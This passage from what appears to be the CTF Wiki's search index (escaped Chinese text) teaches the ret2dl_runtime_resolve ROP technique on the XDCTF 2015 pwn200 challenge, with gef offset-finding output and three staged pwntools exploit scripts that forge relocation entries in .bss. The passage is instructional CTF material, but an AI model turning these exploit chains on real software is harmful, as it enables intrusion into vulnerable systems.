            "text": "\u9ad8\u7ea7ROP\u5176\u5b9e\u548c\u4e00\u822c\u7684ROP\u57fa\u672c\u4e00\u6837\uff0c\u5176\u4e3b\u8981\u7684\u533a\u522b\u5728\u4e8e\u5b83\u5229\u7528\u4e86\u4e00\u4e9b\u66f4\u52a0\u5e95\u5c42\u7684\u539f\u7406\u3002", 
            "title": "\u9ad8\u7ea7ROP"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#ret2_dl_runtime_resolve", 
            "text": "", 
            "title": "ret2_dl_runtime_resolve"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_1", 
            "text": "\u8981\u60f3\u5f04\u61c2\u8fd9\u4e2aROP\u5229\u7528\u6280\u5de7\uff0c\u9700\u8981\u9996\u5148\u7406\u89e3ELF\u6587\u4ef6\u7684\u57fa\u672c\u7ed3\u6784\uff0c\u4ee5\u53ca\u52a8\u6001\u94fe\u63a5\u7684\u57fa\u672c\u8fc7\u7a0b\uff0c\u8bf7\u53c2\u8003executable\u4e2delf\u5bf9\u5e94\u7684\u4ecb\u7ecd\u3002\u8fd9\u91cc\u6211\u53ea\u7ed9\u51fa\u76f8\u5e94\u7684\u5229\u7528\u65b9\u5f0f\u3002  \u6211\u4eec\u77e5\u9053\u5728linux\u4e2d\u662f\u5229\u7528_dl_runtime_resolve(link_map_obj, reloc_index)\u6765\u5bf9\u52a8\u6001\u94fe\u63a5\u7684\u51fd\u6570\u8fdb\u884c\u91cd\u5b9a\u4f4d\u7684\u3002\u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u76f8\u5e94\u7684\u53c2\u6570\u4ee5\u53ca\u5176\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u662f\u4e0d\u662f\u5c31\u53ef\u4ee5\u63a7\u5236\u89e3\u6790\u7684\u51fd\u6570\u4e86\u5462\uff1f\u7b54\u6848\u8fd8\u80af\u5b9a\u7684\u3002\u5177\u4f53\u5229\u7528\u65b9\u5f0f\u5982\u4e0b   \u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570  \u7ed9\u5b9aLink_map\u4ee5\u53caindex\u4e24\u4e2a\u53c2\u6570\u3002  \u5f53\u7136\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7ed9\u5b9a plt0\u5bf9\u5e94\u7684\u6c47\u7f16\u4ee3\u7801\uff0c\u8fd9\u65f6\uff0c\u6211\u4eec\u5c31\u53ea\u9700\u8981\u4e00\u4e2aindex\u5c31\u8db3\u591f\u4e86\u3002    \u63a7\u5236index\u7684\u5927\u5c0f\uff0c\u4ee5\u4fbf\u4e8e\u6307\u5411\u81ea\u5df1\u6240\u63a7\u5236\u7684\u533a\u57df\uff0c\u4ece\u800c\u4f2a\u9020\u4e00\u4e2a\u6307\u5b9a\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002  \u4f2a\u9020\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u4f7f\u5f97\u91cd\u5b9a\u4f4d\u8868\u9879\u6240\u6307\u7684\u7b26\u53f7\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002  \u4f2a\u9020\u7b26\u53f7\u5185\u5bb9\uff0c\u4f7f\u5f97\u7b26\u53f7\u5bf9\u5e94\u7684\u540d\u79f0\u4e5f\u5728\u81ea\u5df1\u53ef\u4ee5\u63a7\u5236\u7684\u8303\u56f4\u5185\u3002   \u6b64\u5916\uff0c\u8fd9\u4e2a\u653b\u51fb\u6210\u529f\u7684\u5f88\u5fc5\u8981\u7684\u6761\u4ef6   dl_resolve\u51fd\u6570\u4e0d\u4f1a\u68c0\u67e5\u5bf9\u5e94\u7684\u7b26\u53f7\u662f\u5426\u8d8a\u754c\uff0c\u5b83\u53ea\u4f1a\u6839\u636e\u6211\u4eec\u6240\u7ed9\u5b9a\u7684\u6570\u636e\u6765\u6267\u884c\u3002  dl_resolve\u51fd\u6570\u6700\u540e\u7684\u89e3\u6790\u6839\u672c\u4e0a\u4f9d\u8d56\u4e8e\u6240\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u3002   \u6ce8\u610f\uff1a   \u7b26\u53f7\u7248\u672c\u4fe1\u606f  \u6700\u597d\u4f7f\u5f97ndx = VERSYM[ (reloc- r_info)   8] \u7684\u503c\u4e3a0\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u627e\u4e0d\u5230\u7684\u60c5\u51b5\u3002    \u91cd\u5b9a\u4f4d\u8868\u9879  r_offset\u5fc5\u987b\u662f\u53ef\u5199\u7684\uff0c\u56e0\u4e3a\u5f53\u89e3\u6790\u5b8c\u51fd\u6570\u540e\uff0c\u5fc5\u987b\u628a\u76f8\u5e94\u51fd\u6570\u7684\u5730\u5740\u586b\u5165\u5230\u5bf9\u5e94\u7684\u5730\u5740\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_2", 
            "text": "\u8bf4\u4e86\u8fd9\u4e48\u591a\uff0c\u8fd9\u4e2a\u5229\u7528\u6280\u5de7\u5176\u5b9e\u8fd8\u662fROP\uff0c\u540c\u6837\u53ef\u4ee5\u7ed5\u8fc7NX\u548cASLR\u4fdd\u62a4\u3002\u4f46\u662f\uff0c\u8fd9\u4e2a\u653b\u51fb\u66f4\u9002\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u7b80\u5355\u7684\u6808\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u4f46\u540c\u65f6\u53c8\u96be\u4ee5\u6cc4\u9732\u83b7\u53d6\u66f4\u591a\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_3", 
            "text": "\u8fd9\u91cc\u4ee5XDCTF 2015\u7684pwn200\u4e3a\u4f8b\u3002\u4e3b\u8981\u53c2\u8003   http://pwn4.fun/2016/11/09/Return-to-dl-resolve/  \uff0c\u6df1\u5165\u6d45\u51fa\u3002  https://www.math1as.com/index.php/archives/341/   \u9996\u5148\u6211\u4eec\u53ef\u4ee5\u7f16\u8bd1\u4e0bret2dlresolve\u6587\u4ef6\u5939\u4e0b\u7684\u6e90\u6587\u4ef6main.c\u6587\u4ef6\u5f97\u5230\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u8fd9\u91cc\u53d6\u6d88\u4e86Canary\u4fdd\u62a4\u3002  \u279c  ret2dlresolve git: ( master )  \u2717 gcc main.c -m32 -fno-stack-protector -o main  \u5728\u4e0b\u9762\u7684\u8bb2\u89e3\u8fc7\u7a0b\u4e2d\uff0c\u6211\u4f1a\u6309\u7167\u4ee5\u4e24\u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u8bb2\u89e3\u3002\u5176\u4e2d\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4f46\u662f\u53ef\u4ee5\u4ed4\u7ec6\u7406\u89e3ret2dlresolve\u7684\u539f\u7406\uff0c\u7b2c\u4e8c\u79cd\u65b9\u6cd5\u5219\u662f\u76f4\u63a5\u4f7f\u7528\u5df2\u6709\u7684\u5de5\u5177\uff0c\u76f8\u5bf9\u5bb9\u6613\u4e00\u70b9\u3002   \u5229\u7528\u6b63\u5e38\u7684\u4ee3\u7801\u6765\u4f7f\u7528\u8be5\u6280\u5de7\u4ece\u800c\u83b7\u53d6shell\u3002  stage 1 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u7684\u6548\u679c\u3002  stage 2 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u6b63\u5e38write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002  stage 3 \u6d4b\u8bd5\u63a7\u5236\u7a0b\u5e8f\u6267\u884cdl_resolve\u51fd\u6570\uff0c\u5e76\u4e14\u76f8\u5e94\u53c2\u6570\u6307\u5411\u4f2a\u9020\u7684write\u51fd\u6570\u7684plt\u65f6\u7684\u6267\u884c\u6548\u679c\u3002    \u5229\u7528roputils\u4e2d\u5df2\u7ecf\u96c6\u6210\u597d\u7684\u5de5\u5177\u6765\u5b9e\u73b0\u653b\u51fb\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_4", 
            "text": "\u663e\u7136\u6211\u4eec\u7a0b\u5e8f\u6709\u4e00\u4e2a\u5f88\u660e\u663e\u7684\u6808\u6ea2\u51fa\u6f0f\u6d1e\u7684\u3002\u8fd9\u9898\u6211\u4eec\u4e0d\u8003\u8651\u6211\u4eec\u6709libc\u7684\u60c5\u51b5\u3002\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5206\u6790\u51fa\u504f\u79fb\u4e3a112\u3002  gef \u27a4    pattern   create   200  [+]   Generating   a   pattern   of   200   bytes  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab  [+]   Saved   as   $_gef0  gef \u27a4    r  Starting   program :   / mnt / hgfs / Hack / ctf / ctf-wiki / pwn / stackoverflow / example / ret2dlresolve / main   Welcome   to   XDCTF2015 ~ !  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab  Program   received   signal   SIGSEGV ,   Segmentation   fault.  0 x62616164   in   ??   ()  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   registers   ] \u2500\u2500\u2500\u2500  $eax     :   0x000000c9  $ebx     :   0x00000000  $ecx     :   0xffffcc6c    \u2192    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama [...]  $edx     :   0x00000100  $esp     :   0xffffcce0    \u2192    eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa [...]  $ebp     :   0x62616163   ( caab ? )  $esi     :   0xf7fac000    \u2192    0x001b1db0  $edi     :   0xffffcd50    \u2192    0xffffcd70    \u2192    0x00000001  $eip     :   0x62616164   ( daab ? )  $cs      :   0x00000023  $ss      :   0x0000002b  $ds      :   0x0000002b  $es      :   0x0000002b  $fs      :   0x00000000  $gs      :   0x00000063  $eflags:   [ carry   PARITY   adjust   zero   SIGN   trap   INTERRUPT   direction   overflow   RESUME   virtualx86   identification ]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   code: i386   ] \u2500\u2500\u2500\u2500  [!]   Cannot   disassemble   from   $PC  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   stack   ] \u2500\u2500\u2500\u2500  [ 0 xffffcce0 ,   l8 ]  8  0 xffffcce0 \u2502+ 0x00 :   eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa [...]    \u2190   $esp  0 xffffcce4 \u2502+ 0x04 :   faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra [...]  0 xffffcce8 \u2502+ 0x08 :   gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa [...]  0 xffffccec \u2502+ 0x0c :   haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta [...]  0 xffffccf0 \u2502+ 0x10 :   iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua [...]  0 xffffccf4 \u2502+ 0x14 :   jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva [...]  0 xffffccf8 \u2502+ 0x18 :   kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa [...]  0 xffffccfc \u2502+ 0x1c :   laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa [...]  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[   trace   ] \u2500\u2500\u2500\u2500  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500  gef \u27a4    pattern   search   [!]   Syntax  pattern   search   PATTERN   [ SIZE ]  gef \u27a4    pattern   search   0x62616164  [+]   Searching   0x62616164  [+]   Found   at   offset   112   ( little-endian   search )   likely", 
            "title": "\u6b63\u5e38\u653b\u51fb"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-1", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u7684\u4e3b\u8981\u76ee\u7684\u662f\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\uff0c\u867d\u7136\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u76f4\u63a5\u6267\u884cwrite\u51fd\u6570\u3002\u4f46\u662f\u8fd9\u91cc\u6211\u4eec\u91c7\u7528\u4e00\u4e2a\u66f4\u52a0\u590d\u6742\u7684\u529e\u6cd5\uff0c\u5373\u4f7f\u7528\u6808\u8fc1\u79fb\u7684\u6280\u5de7\uff0c\u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u6765\u63a7\u5236write\u51fd\u6570\u3002\u5373\u4e3b\u8981\u5206\u4e3a\u4e24\u6b65   \u5c06\u6808\u8fc1\u79fb\u5230bss\u6bb5\u3002  \u63a7\u5236write\u51fd\u6570\u8f93\u51fa\u76f8\u5e94\u5b57\u7b26\u4e32\u3002   \u8fd9\u91cc\u4e3b\u8981\u4f7f\u7528\u4e86pwntools\u4e2d\u7684ROP\u6a21\u5757\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack privot to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack privot, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write cmd= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  rop . write ( 1 ,   base_stage   +   80 ,   len ( sh ))  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u7ed3\u679c\u5982\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 python stage1.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  120912  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 1"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-2", 
            "text": "\u5728\u8fd9\u4e00\u9636\u6bb5\uff0c\u6211\u4eec\u5c06\u4f1a\u5229\u7528dlresolve\u76f8\u5173\u7684\u77e5\u8bc6\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884cwrite\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u5229\u7528plt[0]\u4e2d\u7684\u76f8\u5173\u6307\u4ee4\uff0c\u5373push linkmap\u4ee5\u53ca\u8df3\u8f6c\u5230dl_resolve\u51fd\u6570\u4e2d\u89e3\u6790\u7684\u6307\u4ee4\u3002\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u5f97\u5355\u72ec\u63d0\u4f9b\u4e00\u4e2awrite\u91cd\u5b9a\u4f4d\u9879\u5728plt\u8868\u4e2d\u7684\u504f\u79fb\u3002  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack privot to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack privot, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write cmd= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  write_index   =   ( elf . plt [ write ]   -   plt0 )   /   16   -   1  write_index   *=   8  rop . raw ( plt0 )  rop . raw ( write_index )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( 1 )  rop . raw ( base_stage   +   80 )  rop . raw ( len ( sh ))  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u6548\u679c\u5982\u4e0b\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86cmd\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002  \u279c  ret2dlresolve git: ( master )  \u2717 python stage2.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )  [ + ]  Starting  local  process  ./main : pid  123406  [ * ]  Loaded cached gadgets  for   ./main  [ * ]  Switching to interactive mode\n/bin/sh [ * ]  Got EOF  while  reading in interactive", 
            "title": "stage 2"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#stage-3", 
            "text": "\u8fd9\u4e00\u6b21\uff0c\u6211\u4eec\u540c\u6837\u63a7\u5236dl_resolve\u51fd\u6570\u4e2d\u7684index_offset\u53c2\u6570\uff0c\u4e0d\u8fc7\u8fd9\u6b21\u63a7\u5236\u5176\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684write\u91cd\u5b9a\u4f4d\u9879\u3002  \u9274\u4e8epwntools\u672c\u8eab\u5e76\u4e0d\u652f\u6301\u5bf9\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u4fe1\u606f\u7684\u83b7\u53d6\u3002\u8fd9\u91cc\u6211\u4eec\u624b\u52a8\u770b\u4e00\u4e0b  \u279c  ret2dlresolve git: ( master )  \u2717 readelf -r main  \n\n\u91cd\u5b9a\u4f4d\u8282  .rel.dyn  \u4f4d\u4e8e\u504f\u79fb\u91cf 0x318 \u542b\u6709  3  \u4e2a\u6761\u76ee\uff1a\n \u504f\u79fb\u91cf     \u4fe1\u606f    \u7c7b\u578b              \u7b26\u53f7\u503c      \u7b26\u53f7\u540d\u79f0\n08049ffc   00000306  R_386_GLOB_DAT     00000000    __gmon_start__\n0804a040   00000905  R_386_COPY        0804a040   stdin@GLIBC_2.0\n0804a044   00000705  R_386_COPY        0804a044   stdout@GLIBC_2.0\n\n\u91cd\u5b9a\u4f4d\u8282  .rel.plt  \u4f4d\u4e8e\u504f\u79fb\u91cf 0x330 \u542b\u6709  5  \u4e2a\u6761\u76ee\uff1a\n \u504f\u79fb\u91cf     \u4fe1\u606f    \u7c7b\u578b              \u7b26\u53f7\u503c      \u7b26\u53f7\u540d\u79f0\n0804a00c   00000107  R_386_JUMP_SLOT    00000000    setbuf@GLIBC_2.0\n0804a010   00000207  R_386_JUMP_SLOT    00000000    read@GLIBC_2.0\n0804a014   00000407  R_386_JUMP_SLOT    00000000    strlen@GLIBC_2.0\n0804a018   00000507  R_386_JUMP_SLOT    00000000    __libc_start_main@GLIBC_2.0\n0804a01c   00000607  R_386_JUMP_SLOT    00000000    write@GLIBC_2.0  \u53ef\u4ee5\u770b\u51fawrite\u7684\u91cd\u5b9a\u8868\u9879\u7684r_offset=0x0804a01c\uff0cr_info=0x00000607\u3002\u5177\u4f53\u4ee3\u7801\u5982\u4e0b  from   pwn   import   *  elf   =   ELF ( main )  r   =   process ( ./main )  rop   =   ROP ( ./main )  offset   =   112  bss_addr   =   elf . bss ()  r . recvuntil ( Welcome to XDCTF2015~! \\n )  ## stack privot to bss segment  ## new stack size is 0x800  stack_size   =   0x800  base_stage   =   bss_addr   +   stack_size  ### padding  rop . raw ( a   *   offset )  ### read 100 byte to base_stage  rop . read ( 0 ,   base_stage ,   100 )  ### stack privot, set esp = base_stage  rop . migrate ( base_stage )  r . sendline ( rop . chain ())  ## write sh= /bin/sh  rop   =   ROP ( ./main )  sh   =   /bin/sh  plt0   =   elf . get_section_by_name ( .plt ) . header . sh_addr  rel_plt   =   elf . get_section_by_name ( .rel.plt ) . header . sh_addr  ## making base_stage+24 ---  fake reloc  index_offset   =   base_stage   +   24   -   rel_plt  write_got   =   elf . got [ write ]  r_info   =   0x607  rop . raw ( plt0 )  rop . raw ( index_offset )  ## fake ret addr of write  rop . raw ( bbbb )  rop . raw ( 1 )  rop . raw ( base_stage   +   80 )  rop . raw ( len ( sh ))  rop . raw ( write_got )    # fake reloc  rop . raw ( r_info )  rop . raw ( a   *   ( 80   -   len ( rop . chain ())))  rop . raw ( sh )  rop . raw ( a   *   ( 100   -   len ( rop . chain ())))  r . sendline ( rop . chain ())  r . interactive ()   \u6700\u540e\u7ed3\u679c\u5982\u4e0b\uff0c\u8fd9\u6b21\u6211\u4eec\u5728bss\u6bb5\u4f2a\u9020\u4e86\u4e00\u4e2a\u5047\u7684write\u7684\u91cd\u5b9a\u4f4d\u9879\uff0c\u4ecd\u7136\u8f93\u51fa\u4e86\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002  \u279c  ret2dlresolve git: ( master )  \u2717 python stage3.py [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main \n    